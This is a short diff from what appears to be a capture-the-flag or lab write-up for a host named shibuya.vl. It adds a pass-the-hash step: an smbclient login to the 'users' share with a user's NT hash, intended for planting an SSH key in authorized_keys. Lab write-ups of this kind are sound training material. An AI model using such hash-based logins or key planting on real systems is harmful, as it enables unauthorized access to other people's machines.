@@ -293,6 +293,9 @@ Since i only have a hash i cant SSH yet
 But i can connect to the `users` share and add my public key to authorized_keys then SSH in
 
 ```python
+smbclient \\\\AWSJPDC0522.shibuya.vl\\users -U 'simon.watson' --pw-nt-hash '5d8c3d1a20bd63f60f469f6763ca0d50' 
+Try "help" to get a list of possible commands.
+smb: \>
 
 ```
 
